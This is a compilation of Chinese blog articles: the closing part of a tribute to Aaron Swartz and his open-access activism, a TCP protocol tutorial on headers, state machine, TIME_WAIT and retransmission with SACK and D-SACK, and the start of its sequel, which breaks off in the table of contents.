14岁的时候，他就成为了[RSS1.0](https://en.wikipedia.org/wiki/RSS)的开发组的一员。（后来，他和 [John Gruber](https://en.wikipedia.org/wiki/John_Gruber)一起开发了Markdown）

15岁的时候，进入W3C的 [RDF](https://en.wikipedia.org/wiki/Resource_Description_Framework) 核心工作组，并写了RFC3870——这个文档描述了一个新的media type – “[RDF/XML](https://en.wikipedia.org/wiki/RDF/XML)“，用于定义互联网上的“[语义网络](https://en.wikipedia.org/wiki/Semantic_Web)”

17岁进入斯坦福大学，1年半后，18岁的时候因为受不了教条式的教育缀学，并通过Y Combinator公司的夏季创办人计划成立Infogami软件公司，在那里，他设想了一个Wiki平台来实现他的Internet Open Library——一个开放的网络图书馆。并写了著名的web.py 开发框架。但他觉得自己太年轻，还要有一个合伙人，于是Y Combinator建议他和Reddit合并。于是他在19岁的时候成了Reddit的创始人

虽然Reddit不挣钱，但是相当火，当他20岁的时候（2006年10月），他们把Reddit卖给了[Condé Nast出版社](https://en.wikipedia.org/wiki/Condé_Nast_Publications)，据说挣到了百万美金。然后，他去了这家出版社工作，受不了办公室的那种工作环境，2007年1月离职。

但是，你能想得到这么天才的一个人，于2013年1月11日自杀了么？那年他才26岁。



从前面Aaron的经历我们可以看到，他是一个特别喜欢Wiki的人，也是非常喜欢开放的人，但并不喜欢那些有CopyRight的东西，也也不喜欢那些循规蹈矩的东西，他喜欢质疑，他喜欢打破常规，他用生命坚持着互联网真正的开放精神。但是这样一来，必然会和守旧的世界相冲突。

他在YC搞的那个Internet Open Library（互联网开放图书馆）的项目，他就想把那些没有Copyright的书籍和学术期刊放在网上让全世界的人免费查阅。**他就认为固体的图书馆遮蔽了知识的传播，互联网理应成为连接书籍，读者，作者，纸张与思想的最好载体，他非常痛恨任何一家巨型的机构独吞所有书籍的做法。他想把Public Access 变成 Public Domain**。在他的青少年时期，他就在不懈地和一切限制信息自由交换和自由共享的做法做斗争。这是他认为的互联网精神，他同时也觉得这和美国民主自由的宪法的精神是一致的。

其中有一个例子是这样的，美国法院行政办公室有一个叫 [PACER](https://en.wikipedia.org/wiki/PACER_(law))（Public Access to Court Electronic Records） 的政府服务。这个服务会把法庭记录的文件放在网上，如果你要看的话，一页要付费8美分（注意是每页，不是每个文档，美国政府说这只是成本式的收费），这个事他非常不能理解，他觉得这些文件本来就属于公众，没有CopyRight，为什么属于公众的东西还要收费。PACER这个服务每年可以为政府带来1.2亿美金的收入。

于是Aaron在2008年9月4日到20日，他22岁的时候，他用Perl在AWS上写了一个程序，从PACER上下载了270万的文档（2000万页，纽约时报里说他下载大约是总量的20%，但是也有人不到总量的1%）。于是FBI对他调查了两个多月，但最终没有对他起诉。（今天，PACER还在收费，不过你可以使用一个叫[RECAP](https://en.wikipedia.org/wiki/RECAP)的Firefox插件来免费浏览当年Aaron下载的相关的法律文档）

2008年同年，Aaron创建了Watchdog.net – “the good government site with teeth” 专门用来收集和呈现和政客相关的数据（这个网站访问不到了，不过你可以在[Aaron的blog上看一下他的想法](http://www.aaronsw.com/weblog/watchdog)）。然后，他还起草了*[Guerrilla Open Access Manifesto](http://openaccessmanifesto.org/)*（[中文版](http://openaccessmanifesto.org/游击队开放访问宣言/)） 下面是节选

> 信息就是能源。但就像所有能源一样，有些人只想占为己有。世界上所有的科学和文化遗产，已在书籍和期刊上发布了数个世纪，正渐渐地被少数私有的公司数字化并上锁。想要阅读那些有着最著名研究成果的论文？你必须支付给如 Reed Elsevier 这样的出版商大把钱。
>
> …… ……
>
> 我们要夺回信息，无论它们被存在何处，制作我们的副本并和全世界分享。我们要取到版权到期的东西并将它们归档，我们要买下秘密的资料库并将它们放到网上。我们要下载科学期刊并将它们上传到文件分享网络。我们要为游击队开放访问而战。
>
> 只要全世界有足够多的我们，那就不仅是传达了一个反对知识私有化的强有力信号，我们还将让它成为过去。你愿意和我们一起吗？
>
> 亚伦·斯沃茨 (Aaron Swartz) 2008 年 7 月，意大利 Eremo

Aaron觉得那些对人类有价值的科学和文化遗产属于全人类，美国大学每年会向那些出版学术期刊、论文的机构（比如 ISI，Jstor）支付许可费用，许可费用极高，他觉得这是这个时代的悲剧。于是完美主义的他产生了一种责任感。

2009年，他成立了[Progressive Change Campaign Committee](https://en.wikipedia.org/wiki/Progressive_Change_Campaign_Committee)（进步改变运动委员会），2010年，他又创建了 [Demand Progress](https://en.wikipedia.org/wiki/Demand_Progress) （求进会）——利用互联网来组织群众与议会和政府对话。

也因为Aaron并不理解政府和这个时代的这些荒唐的行为，于是他开始学习各种政治上的东西去寻求突破，这让他在2010年到2011年，在哈佛大学Edmond J. Safra研究实验室以Lab Fellow的身份主导到了“制度腐败”课题的研究。也因为这个身份，Aaron在MIT做访问学者的时候有 [JSTOR](https://en.wikipedia.org/wiki/JSTOR)的帐号可以通过MIT的网络访问大量的学术期刊。

于是，他把他的laptop放到了地下室网络交换机的机房中，直接插上网线，然后全天后地下载那些JSTOR的学术期刊。（他利用了这些学术期刊的URL链接中的规律来下载所有的期刊），一开始JSTOR把他的帐号和IP封了，并报告给了警，美国的国家安全警察找到了那间楼道里的机房，然后让JSTOR不禁止他访问，并在那间机房里安了摄像头，钓鱼执法。然后等Aaron去换硬盘时录好像，2011年1月6日就把他给抓了。

那年Aaron才24岁。2011年7月11日，检查官以通信欺诈、计算机欺诈、非法获得信息，以及破坏被保护的罪名电脑来起诉他。可能会受到35年以上的牢狱之灾。这是相当重的罪名。你能想像得到为什么罪名会这么重吗？

事后，JSTOR发声明，说他们并不想起诉Aaron，起诉Aaron的是政府行为，而MIT方面虽然也放弃起诉，并也发表了相关的说明——保持中立。保持中立让MIT基本上名誉扫地，因为这种保持中立的行为违背于MIT一贯鼓吹的黑客文化，MIT成了千夫之指。

当然，美国政府的检查官坚持以重罪起诉他。当时，放在Aaron前有两条路：1）认罪，承认犯下重罪，35年的判决会变成3个月入狱+1年的居家监禁（不得使用电脑），2）不认罪，那就有可能接受35监禁年的最坏结果。Aaron选择了后者，而他的女友则选择了认罪。他的第一任女友后来非常的悔恨，面对国家机器，个体太渺小了。

在起诉期间，大家是否还记得美国那个臭名昭著的SOPA（ [Stop Online Piracy Act](https://en.wikipedia.org/wiki/Stop_Online_Piracy_Act)）法案？Aaron通过他的 [Demand Progress](https://en.wikipedia.org/wiki/Demand_Progress) 把民众们网聚起来，和政府做斗争，最终导致了整个社会都在反对SOPA，也导致了那些议员纷纷改变自己的想法，并导致了白宫最终放弃了这个法案。这是一次民主的胜利，与Aaron有密切的相关。（相信大家都还记得那时美国各大网站都在反对这个网络审查制度）

![斯沃茨在2012年反对禁止网络盗版法案(SOPA)的抗议活动上发言](photo/800px-AaronSwartzPIPA.jpg)斯沃茨在2012年反对禁止网络盗版法案(SOPA)的抗议活动上发言

而在次年2012年9月，政府对Aaron进行了更为严厉的起诉，新加入了另外9条起诉，如果成立，Aaron最多获刑50年外加100万美金的罚款。同样，检察官给出了优惠条件，只要Aaron认罪，那就只起诉他6个月的监禁。Aaron再次拒绝。

看到这里，你觉得下载一些期刊，也没有挣钱，为什么要判他这么重呢？这后面有什么故事呢？这是不是更像是一种政治迫害呢（这段时间，好像这些消息并没有进入中国，我们的大多数人依然在使用百度在墙内活得很滋润，另外，这个事在美国那边的IT 圈闹得很大，但似乎也不见各个IT圈的老大们有没有什么表态）

不过，可以肯定的是，美国政府受够了像阿桑奇这样的人了，而Aaron让美国政府更为害怕在有规模有组织的事，所以一定少不了相关的政治迫害，天下政府一般黑。

之后，2013年1月11日，Aaron自杀了。大家觉得他是因为来自美国政府的长期恐吓的压力和以及长期的抑郁（理想主义者可能都会有或多或少的抑郁证）

**这就是Aaron Swartz传奇的一生。他用他的生命捍卫了互联网的开放和自由。**

![87d31fea0996abbedb297c70b8b0b945_b](photo/87d31fea0996abbedb297c70b8b0b945_b.jpg)

互联网之父，[Tim Berners-Lee](https://en.wikipedia.org/wiki/Tim_Berners-Lee)，在2012伦敦奥运会上的网络环节我们都见过这个人。世界上第一个web网站是1991年8月6日在CERN内的NeXT服务器上运行（今天这个网站依然可以访问：[链接](http://info.cern.ch/hypertext/WWW/TheProject.html)），Tim并被没有用这个发明挣钱，而是无偿地把WWW的构想和设计推广给了全世界。《时代》周刊评论他的时候用了这样的一条话：“与所有的推动人类进程的发明不同，这是一件纯粹个人的劳动成果”。

而Aaron最崇拜的人就是Tim，Tim也是Aaron的精神导师。

Aaron死了以后，Aaron朋友和合作者，哈佛大学法学院教授Laurence Lessig，回忆说，他当年和仅15岁的Aaron 有过一次谈话。Aaron问他：“您刚才讲到网络审查和管制的这些弊病，那您有没有什么实际的方案来解决这些问题呢？”Lessig有点尴尬地说：“没有。我是个学者，我只负责做研究，解决问题不关我的事儿。”Aaron接着问：“您是个学者，所以解决问题不关你的事儿。那，您作为一个公民，又该如何呢？”

有个男孩叫 Jack Andraka，来自巴尔的摩，14岁，阅读了 Aaron 自杀前推广的JSTOR 的免费学术论文，想出了一种提早检测胰腺癌的方法（一般胰腺癌被查出的时候就是你死的时候。）以此，他成功去了约翰霍普金斯大学做研究。Jack说——

> “我之所以上了新闻，是因为我们的实验成功了，而这就是为什么 Aaron 做的事有那么重要……这个宇宙中的真理不是只有那些政策制定者曾经弄清楚过的，比如应该限速多少，它还包括那些能让你的孩子，不会因胰腺癌而死的研究。**如果没有访问阅读权，那个能解决你的问题的人，可能就永远找不到答案**。”

 

**强烈推荐纪录片——《[互联网之子](http://www.tudou.com/programs/view/jefojo_-HjQ/)》**



 

Aaron说的一句话让我挺有感触的——

**相信你应该真的每时每刻都问自己，现在这世界有什么最重要的事是我能参与去做的？**

**如果你没在做那最重要的事，那又是为什么？**

 

![aaron_swartz__freedom_fighter_by_caq_qoq-d5rzbi8](photo/aaron_swartz__freedom_fighter_by_caq_qoq-d5rzbi8.jpg)

**延伸阅读**：[偷了世界的程序员](https://coolshell.cn/articles/3363.html)

（全文完）

# TCP 的那些事儿（上）

#####  [2014年05月28日 ](https://coolshell.cn/articles/11564.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [237 条评论](https://coolshell.cn/articles/11564.html#comments) 488,306 人阅读

![img](photo/tin-can-phone.jpg)TCP是一个巨复杂的协议，因为他要解决很多问题，而这些问题又带出了很多子问题和阴暗面。所以学习TCP本身是个比较痛苦的过程，但对于学习的过程却能让人有很多收获。关于TCP这个协议的细节，我还是推荐你去看[W.Richard Stevens](http://www.kohala.com/start/)的《[TCP/IP 详解 卷1：协议](http://book.douban.com/subject/1088054/)》（当然，你也可以去读一下[RFC793](http://tools.ietf.org/html/rfc793)以及后面N多的RFC）。另外，本文我会使用英文术语，这样方便你通过这些英文关键词来查找相关的技术文档。

之所以想写这篇文章，目的有三个，

- 一个是想锻炼一下自己是否可以用简单的篇幅把这么复杂的TCP协议描清楚的能力。
- 另一个是觉得现在的好多程序员基本上不会认认真真地读本书，喜欢快餐文化，所以，希望这篇快餐文章可以让你对TCP这个古典技术有所了解，并能体会到软件设计中的种种难处。并且你可以从中有一些软件设计上的收获。
- 最重要的希望这些基础知识可以让你搞清很多以前一些似是而非的东西，并且你能意识到基础的重要。

所以，本文不会面面俱到，只是对TCP协议、算法和原理的科普。



我本来只想写一个篇幅的文章的，但是TCP真TMD的复杂，比C++复杂多了，这30多年来，各种优化变种争论和修改。所以，写着写着就发现只有砍成两篇。

- 上篇中，主要向你介绍TCP协议的定义和丢包时的重传机制。
- 下篇中，重点介绍TCP的流迭、拥塞处理。

废话少说，首先，我们需要知道TCP在网络OSI的七层模型中的第四层——Transport层，IP在第三层——Network层，ARP在第二层——Data Link层，在第二层上的数据，我们叫Frame，在第三层上的数据叫Packet，第四层的数据叫Segment。

首先，我们需要知道，我们程序的数据首先会打到TCP的Segment中，然后TCP的Segment会打到IP的Packet中，然后再打到以太网Ethernet的Frame中，传到对端后，各个层解析自己的协议，然后把数据交给更高层的协议处理。

目录



[TCP头格式](https://coolshell.cn/articles/11564.html#TCP头格式)[TCP的状态机](https://coolshell.cn/articles/11564.html#TCP的状态机)[数据传输中的Sequence Number](https://coolshell.cn/articles/11564.html#数据传输中的Sequence_Number)[TCP重传机制](https://coolshell.cn/articles/11564.html#TCP重传机制)[超时重传机制](https://coolshell.cn/articles/11564.html#超时重传机制)[快速重传机制](https://coolshell.cn/articles/11564.html#快速重传机制)[SACK 方法](https://coolshell.cn/articles/11564.html#SACK_方法)[Duplicate SACK – 重复收到数据的问题](https://coolshell.cn/articles/11564.html#Duplicate_SACK_–_重复收到数据的问题)

#### TCP头格式

接下来，我们来看一下TCP头的格式

![img](photo/TCP-Header-01.jpg)TCP头格式（[图片来源](http://nmap.org/book/tcpip-ref.html)）

你需要注意这么几点：

- TCP的包是没有IP地址的，那是IP层上的事。但是有源端口和目标端口。
- 一个TCP连接需要四个元组来表示是同一个连接（src_ip, src_port, dst_ip, dst_port）准确说是五元组，还有一个是协议。但因为这里只是说TCP协议，所以，这里我只说四元组。
- 注意上图中的四个非常重要的东西：
  - **Sequence Number**是包的序号，**用来解决网络包乱序（reordering）问题。**
  - **Acknowledgement Number**就是ACK——用于确认收到，**用来解决不丢包的问题**。
  - **Window又叫Advertised-Window**，也就是著名的滑动窗口（Sliding Window），**用于解决流控的**。
  - **TCP Flag** ，也就是包的类型，**主要是用于操控TCP的状态机的**。

关于其它的东西，可以参看下面的图示

![img](photo/TCP-Header-02.jpg)

（[图片来源](http://nmap.org/book/tcpip-ref.html)）

#### TCP的状态机

其实，**网络上的传输是没有连接的，包括TCP也是一样的**。而TCP所谓的“连接”，其实只不过是在通讯的双方维护一个“连接状态”，让它看上去好像有连接一样。所以，TCP的状态变换是非常重要的。

下面是：“**TCP协议的状态机**”（[图片来源](http://www.tcpipguide.com/free/t_TCPOperationalOverviewandtheTCPFiniteStateMachineF-2.htm)） 和 “**TCP建链接**”、“**TCP断链接**”、“**传数据**” 的对照图，我把两个图并排放在一起，这样方便在你对照着看。另外，下面这两个图非常非常的重要，你一定要记牢。（吐个槽：看到这样复杂的状态机，就知道这个协议有多复杂，复杂的东西总是有很多坑爹的事情，所以TCP协议其实也挺坑爹的）

![img](photo/tcpfsm.png) ![img](photo/tcp_open_close.jpg)

很多人会问，为什么建链接要3次握手，断链接需要4次挥手？

- **对于建链接的3次握手，**主要是要初始化Sequence Number 的初始值。通信的双方要互相通知对方自己的初始化的Sequence Number（缩写为ISN：Inital Sequence Number）——所以叫SYN，全称Synchronize Sequence Numbers。也就上图中的 x 和 y。这个号要作为以后的数据通信的序号，以保证应用层接收到的数据不会因为网络上的传输的问题而乱序（TCP会用这个序号来拼接数据）。

- **对于4次挥手，**其实你仔细看是2次，因为TCP是全双工的，所以，发送方和接收方都需要Fin和Ack。只不过，有一方是被动的，所以看上去就成了所谓的4次挥手。如果两边同时断连接，那就会就进入到CLOSING状态，然后到达TIME_WAIT状态。下图是双方同时断连接的示意图（你同样可以对照着TCP状态机看）：

![img](photo/tcpclosesimul.png)
两端同时断连接（[图片来源](http://www.tcpipguide.com/free/t_TCPConnectionTermination-4.htm)）

 

另外，有几个事情需要注意一下：

- **关于建连接时SYN超时**。试想一下，如果server端接到了clien发的SYN后回了SYN-ACK后client掉线了，server端没有收到client回来的ACK，那么，这个连接处于一个中间状态，即没成功，也没失败。于是，server端如果在一定时间内没有收到的TCP会重发SYN-ACK。在Linux下，默认重试次数为5次，重试的间隔时间从1s开始每次都翻售，5次的重试时间间隔为1s, 2s, 4s, 8s, 16s，总共31s，第5次发出后还要等32s都知道第5次也超时了，所以，总共需要 1s + 2s + 4s+ 8s+ 16s + 32s = 2^6 -1 = 63s，TCP才会把断开这个连接。

- **关于SYN Flood攻击**。一些恶意的人就为此制造了SYN Flood攻击——给服务器发了一个SYN后，就下线了，于是服务器需要默认等63s才会断开连接，这样，攻击者就可以把服务器的syn连接的队列耗尽，让正常的连接请求不能处理。于是，Linux下给了一个叫**tcp_syncookies**的参数来应对这个事——当SYN队列满了后，TCP会通过源地址端口、目标地址端口和时间戳打造出一个特别的Sequence Number发回去（又叫cookie），如果是攻击者则不会有响应，如果是正常连接，则会把这个 SYN Cookie发回来，然后服务端可以通过cookie建连接（即使你不在SYN队列中）。请注意，**请先千万别用tcp_syncookies来处理正常的大负载的连接的情况**。因为，synccookies是妥协版的TCP协议，并不严谨。对于正常的请求，你应该调整三个TCP参数可供你选择，第一个是：tcp_synack_retries 可以用他来减少重试次数；第二个是：tcp_max_syn_backlog，可以增大SYN连接数；第三个是：tcp_abort_on_overflow 处理不过来干脆就直接拒绝连接了。

- **关于ISN的初始化**。ISN是不能hard code的，不然会出问题的——比如：如果连接建好后始终用1来做ISN，如果client发了30个segment过去，但是网络断了，于是 client重连，又用了1做ISN，但是之前连接的那些包到了，于是就被当成了新连接的包，此时，client的Sequence Number 可能是3，而Server端认为client端的这个号是30了。全乱了。[RFC793](http://tools.ietf.org/html/rfc793)中说，ISN会和一个假的时钟绑在一起，这个时钟会在每4微秒对ISN做加一操作，直到超过2^32，又从0开始。这样，一个ISN的周期大约是4.55个小时。因为，我们假设我们的TCP Segment在网络上的存活时间不会超过Maximum Segment Lifetime（缩写为MSL – [Wikipedia语条](https://en.wikipedia.org/wiki/Maximum_Segment_Lifetime)），所以，只要MSL的值小于4.55小时，那么，我们就不会重用到ISN。

- **关于 MSL 和 TIME_WAIT**。通过上面的ISN的描述，相信你也知道MSL是怎么来的了。我们注意到，在TCP的状态图中，从TIME_WAIT状态到CLOSED状态，有一个超时设置，这个超时设置是 2*MSL（[RFC793](http://tools.ietf.org/html/rfc793)定义了MSL为2分钟，Linux设置成了30s）为什么要这有TIME_WAIT？为什么不直接给转成CLOSED状态呢？主要有两个原因：1）TIME_WAIT确保有足够的时间让对端收到了ACK，如果被动关闭的那方没有收到Ack，就会触发被动端重发Fin，一来一去正好2个MSL，2）有足够的时间让这个连接不会跟后面的连接混在一起（你要知道，有些自做主张的路由器会缓存IP数据包，如果连接被重用了，那么这些延迟收到的包就有可能会跟新连接混在一起）。你可以看看这篇文章《[TIME_WAIT and its design implications for protocols and scalable client server systems](http://www.serverframework.com/asynchronousevents/2011/01/time-wait-and-its-design-implications-for-protocols-and-scalable-servers.html)》

- **关于TIME_WAIT数量太多**。从上面的描述我们可以知道，TIME_WAIT是个很重要的状态，但是如果在大并发的短链接下，TIME_WAIT 就会太多，这也会消耗很多系统资源。只要搜一下，你就会发现，十有八九的处理方式都是教你设置两个参数，一个叫**tcp_tw_reuse**，另一个叫**tcp_tw_recycle**的参数，这两个参数默认值都是被关闭的，后者recyle比前者resue更为激进，resue要温柔一些。另外，如果使用tcp_tw_reuse，必需设置tcp_timestamps=1，否则无效。这里，你一定要注意，**打开这两个参数会有比较大的坑——可能会让TCP连接出一些诡异的问题**（因为如上述一样，如果不等待超时重用连接的话，新的连接可能会建不上。正如[官方文档](https://www.kernel.org/doc/Documentation/networking/ip-sysctl.txt)上说的一样“**It should not be changed without advice/request of technical experts**”）。

- - **关于tcp_tw_reuse**。官方文档上说tcp_tw_reuse 加上tcp_timestamps（又叫PAWS, for Protection Against Wrapped Sequence Numbers）可以保证协议的角度上的安全，但是你需要tcp_timestamps在两边都被打开（你可以读一下[tcp_twsk_unique](http://lxr.free-electrons.com/ident?i=tcp_twsk_unique)的源码 ）。我个人估计还是有一些场景会有问题。

- - **关于tcp_tw_recycle**。如果是tcp_tw_recycle被打开了话，会假设对端开启了tcp_timestamps，然后会去比较时间戳，如果时间戳变大了，就可以重用。但是，如果对端是一个NAT网络的话（如：一个公司只用一个IP出公网）或是对端的IP被另一台重用了，这个事就复杂了。建链接的SYN可能就被直接丢掉了（你可能会看到connection time out的错误）（如果你想观摩一下Linux的内核代码，请参看源码[ tcp_timewait_state_process](http://lxr.free-electrons.com/ident?i=tcp_timewait_state_process)）。

- - **关于tcp_max_tw_buckets**。这个是控制并发的TIME_WAIT的数量，默认值是180000，如果超限，那么，系统会把多的给destory掉，然后在日志里打一个警告（如：time wait bucket table overflow），官网文档说这个参数是用来对抗DDoS攻击的。也说的默认值180000并不小。这个还是需要根据实际情况考虑。

**Again，使用tcp_tw_reuse和tcp_tw_recycle来解决TIME_WAIT的问题是非常非常危险的，因为这两个参数违反了TCP协议（[RFC 1122](http://tools.ietf.org/html/rfc1122)）** 

其实，TIME_WAIT表示的是你主动断连接，所以，这就是所谓的“不作死不会死”。试想，如果让对端断连接，那么这个破问题就是对方的了，呵呵。另外，如果你的服务器是于HTTP服务器，那么设置一个[HTTP的KeepAlive](https://en.wikipedia.org/wiki/HTTP_persistent_connection)有多重要（浏览器会重用一个TCP连接来处理多个HTTP请求），然后让客户端去断链接（你要小心，浏览器可能会非常贪婪，他们不到万不得已不会主动断连接）。

#### 数据传输中的Sequence Number

下图是我从Wireshark中截了个我在访问coolshell.cn时的有数据传输的图给你看一下，SeqNum是怎么变的。（使用Wireshark菜单中的Statistics ->Flow Graph… ）

![img](photo/tcp_data_seq_num.jpg)

你可以看到，**SeqNum的增加是和传输的字节数相关的**。上图中，三次握手后，来了两个Len:1440的包，而第二个包的SeqNum就成了1441。然后第一个ACK回的是1441，表示第一个1440收到了。

**注意**：如果你用Wireshark抓包程序看3次握手，你会发现SeqNum总是为0，不是这样的，Wireshark为了显示更友好，使用了Relative SeqNum——相对序号，你只要在右键菜单中的protocol preference 中取消掉就可以看到“Absolute SeqNum”了

#### TCP重传机制

TCP要保证所有的数据包都可以到达，所以，必需要有重传机制。

注意，接收端给发送端的Ack确认只会确认最后一个连续的包，比如，发送端发了1,2,3,4,5一共五份数据，接收端收到了1，2，于是回ack 3，然后收到了4（注意此时3没收到），此时的TCP会怎么办？我们要知道，因为正如前面所说的，**SeqNum和Ack是以字节数为单位，所以ack的时候，不能跳着确认，只能确认最大的连续收到的包**，不然，发送端就以为之前的都收到了。

##### 超时重传机制

一种是不回ack，死等3，当发送方发现收不到3的ack超时后，会重传3。一旦接收方收到3后，会ack 回 4——意味着3和4都收到了。

但是，这种方式会有比较严重的问题，那就是因为要死等3，所以会导致4和5即便已经收到了，而发送方也完全不知道发生了什么事，因为没有收到Ack，所以，发送方可能会悲观地认为也丢了，所以有可能也会导致4和5的重传。

对此有两种选择：

- 一种是仅重传timeout的包。也就是第3份数据。
- 另一种是重传timeout后所有的数据，也就是第3，4，5这三份数据。

这两种方式有好也有不好。第一种会节省带宽，但是慢，第二种会快一点，但是会浪费带宽，也可能会有无用功。但总体来说都不好。因为都在等timeout，timeout可能会很长（在下篇会说TCP是怎么动态地计算出timeout的）

##### 快速重传机制

于是，TCP引入了一种叫**Fast Retransmit** 的算法，**不以时间驱动，而以数据驱动重传**。也就是说，如果，包没有连续到达，就ack最后那个可能被丢了的包，如果发送方连续收到3次相同的ack，就重传。Fast Retransmit的好处是不用等timeout了再重传。

比如：如果发送方发出了1，2，3，4，5份数据，第一份先到送了，于是就ack回2，结果2因为某些原因没收到，3到达了，于是还是ack回2，后面的4和5都到了，但是还是ack回2，因为2还是没有收到，于是发送端收到了三个ack=2的确认，知道了2还没有到，于是就马上重转2。然后，接收端收到了2，此时因为3，4，5都收到了，于是ack回6。示意图如下：

![img](photo/FASTIncast021.png)

Fast Retransmit只解决了一个问题，就是timeout的问题，它依然面临一个艰难的选择，就是，是重传之前的一个还是重传所有的问题。对于上面的示例来说，是重传#2呢还是重传#2，#3，#4，#5呢？因为发送端并不清楚这连续的3个ack(2)是谁传回来的？也许发送端发了20份数据，是#6，#10，#20传来的呢。这样，发送端很有可能要重传从2到20的这堆数据（这就是某些TCP的实际的实现）。可见，这是一把双刃剑。

##### SACK 方法

另外一种更好的方式叫：**Selective Acknowledgment (SACK)**（参看[RFC 2018](http://tools.ietf.org/html/rfc2018)），这种方式需要在TCP头里加一个SACK的东西，ACK还是Fast Retransmit的ACK，SACK则是汇报收到的数据碎版。参看下图：

![img](photo/tcp_sack_example-1024x577.jpg)

这样，在发送端就可以根据回传的SACK来知道哪些数据到了，哪些没有到。于是就优化了Fast Retransmit的算法。当然，这个协议需要两边都支持。在 Linux下，可以通过**tcp_sack**参数打开这个功能（Linux 2.4后默认打开）。

这里还需要注意一个问题——**接收方Reneging，所谓Reneging的意思就是接收方有权把已经报给发送端SACK里的数据给丢了**。这样干是不被鼓励的，因为这个事会把问题复杂化了，但是，接收方这么做可能会有些极端情况，比如要把内存给别的更重要的东西。**所以，发送方也不能完全依赖SACK，还是要依赖ACK，并维护Time-Out，如果后续的ACK没有增长，那么还是要把SACK的东西重传，另外，接收端这边永远不能把SACK的包标记为Ack。**

注意：SACK会消费发送方的资源，试想，如果一个攻击者给数据发送方发一堆SACK的选项，这会导致发送方开始要重传甚至遍历已经发出的数据，这会消耗很多发送端的资源。详细的东西请参看《[TCP SACK的性能权衡](http://www.ibm.com/developerworks/cn/linux/l-tcp-sack/)》

##### Duplicate SACK – 重复收到数据的问题

Duplicate SACK又称D-SACK，**其主要使用了SACK来告诉发送方有哪些数据被重复接收了**。[RFC-2883 ](http://www.ietf.org/rfc/rfc2883.txt)里有详细描述和示例。下面举几个例子（来源于[RFC-2883](http://www.ietf.org/rfc/rfc2883.txt)）

D-SACK使用了SACK的第一个段来做标志，

- 如果SACK的第一个段的范围被ACK所覆盖，那么就是D-SACK

- 如果SACK的第一个段的范围被SACK的第二个段覆盖，那么就是D-SACK

**示例一：ACK丢包**

下面的示例中，丢了两个ACK，所以，发送端重传了第一个数据包（3000-3499），于是接收端发现重复收到，于是回了一个SACK=3000-3500，因为ACK都到了4000意味着收到了4000之前的所有数据，所以这个SACK就是D-SACK——旨在告诉发送端我收到了重复的数据，而且我们的发送端还知道，数据包没有丢，丢的是ACK包。

```
	Transmitted  Received    ACK Sent
	Segment      Segment     (Including SACK Blocks)

	3000-3499    3000-3499   3500 (ACK dropped)
	3500-3999    3500-3999   4000 (ACK dropped)
	3000-3499    3000-3499   4000, SACK=3000-3500
                                        ---------
```

 **示例二，网络延误**

下面的示例中，网络包（1000-1499）被网络给延误了，导致发送方没有收到ACK，而后面到达的三个包触发了“Fast Retransmit算法”，所以重传，但重传时，被延误的包又到了，所以，回了一个SACK=1000-1500，因为ACK已到了3000，所以，这个SACK是D-SACK——标识收到了重复的包。

这个案例下，发送端知道之前因为“Fast Retransmit算法”触发的重传不是因为发出去的包丢了，也不是因为回应的ACK包丢了，而是因为网络延时了。

```
    Transmitted    Received    ACK Sent
    Segment        Segment     (Including SACK Blocks)

    500-999        500-999     1000
    1000-1499      (delayed)
    1500-1999      1500-1999   1000, SACK=1500-2000
    2000-2499      2000-2499   1000, SACK=1500-2500
    2500-2999      2500-2999   1000, SACK=1500-3000
    1000-1499      1000-1499   3000
                   1000-1499   3000, SACK=1000-1500
                                          ---------
```

 

可见，引入了D-SACK，有这么几个好处：

1）可以让发送方知道，是发出去的包丢了，还是回来的ACK包丢了。

2）是不是自己的timeout太小了，导致重传。

3）网络上出现了先发的包后到的情况（又称reordering）

4）网络上是不是把我的数据包给复制了。

 **知道这些东西可以很好得帮助TCP了解网络情况，从而可以更好的做网络上的流控**。

Linux下的tcp_dsack参数用于开启这个功能（Linux 2.4后默认打开）

好了，上篇就到这里结束了。如果你觉得我写得还比较浅显易懂，那么，欢迎移步看下篇《[TCP的那些事（下）](https://coolshell.cn/articles/11609.html)》

 **[TCP的那些事儿（下）>>>](https://coolshell.cn/articles/11609.html)**

（上篇完）

# TCP 的那些事儿（下）

#####  [2014年05月28日 ](https://coolshell.cn/articles/11609.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [162 条评论](https://coolshell.cn/articles/11609.html#comments) 284,105 人阅读

![img](photo/xin_2001040422167711230318.jpg)这篇文章是下篇，所以如果你对TCP不熟悉的话，还请你先看看上篇《[TCP的那些事儿（上）](https://coolshell.cn/articles/11564.html)》 上篇中，我们介绍了TCP的协议头、状态机、数据重传中的东西。但是TCP要解决一个很大的事，那就是要在一个网络根据不同的情况来动态调整自己的发包的速度，小则让自己的连接更稳定，大则让整个网络更稳定。在你阅读下篇之前，你需要做好准备，本篇文章有好些算法和策略，可能会引发你的各种思考，让你的大脑分配很多内存和计算资源，所以，不适合在厕所中阅读。

目录



[TCP的RTT算法](https://coolshell.cn/articles/11609.html#TCP的RTT算法)[经典算法](https://coolshell.cn/articles/11609.html#经典算法)[Karn / Partridge 算法](https://coolshell.cn/articles/11609.html#Karn_Partridge_算法)[Jacobson / Karels 算法](https://coolshell.cn/articles/11609.html#Jacobson_Karels_算法)[TCP滑动窗口](https://coolshell.cn/articles/11609.html#TCP滑动窗口)[Zero Window](https://coolshell.cn/articles/11609.html#Zero_Window)[Silly Window Syndrome](https://coolshell.cn/articles/11609.html#Silly_Window_Syndrome)[TCP的拥塞处理 – Congestion Handling](https://coolshell.cn/articles/11609.html#TCP的拥塞处理_–_Congestion_Handling)[慢热启动算法 – Slow Start](https://coolshell.cn/articles/11609.html#慢热启动算法_–_Slow_Start)[ 拥塞避免算法 – Congestion Avoidance](https://coolshell.cn/articles/11609.html#_拥塞避免算法_–_Congestion_Avoidance)[拥塞状态时的算法](https://coolshell.cn/articles/11609.html#拥塞状态时的算法)[快速恢复算法 – Fast Recovery](https://coolshell.cn/articles/11609.html#快速恢复算法_–_Fast_Recovery)[算法示意图](https://coolshell.cn/articles/11609.html#算法示意图)[FACK算法](https://coolshell.cn/articles/11609.html#FACK算法)[其它拥塞控制算法简介](https://coolshell.cn/articles/11609.html#其它拥塞控制算法简介)[TCP Vegas 拥塞控制算法](https://coolshell.cn/articles/11609.html#TCP_Vegas_拥塞控制算法)[HSTCP(High Speed TCP) 算法](https://coolshell.cn/articles/11609.html#HSTCPHigh_Speed_TCP_算法)[ TCP BIC 算法](https://coolshell.cn/articles/11609.html#_TCP_BIC_算法)[TCP 